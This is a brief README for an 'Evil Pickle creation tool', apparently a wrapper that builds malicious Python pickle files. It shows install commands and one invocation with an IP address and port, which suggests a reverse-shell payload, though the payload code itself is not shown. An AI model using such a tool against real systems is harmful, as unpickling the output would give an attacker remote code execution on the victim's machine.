## Evil Pickle creation tool

This is a [Tinyscript](https://github.com/dhondta/python-tinyscript) wrapper for [this Gist](https://gist.githubusercontent.com/BGrewell/ba619281070cc6185d81e32791a2289e/raw/fb63ce7aec76b2bf3313cae0333d1603d183550b/rotten_pickle.py), working with Python 2 and 3.

```session
$ pip install tinyscript
$ tsm install evil-pickle-maker
```

```session
$ evil-pickle-maker 1.2.3.4 12345
```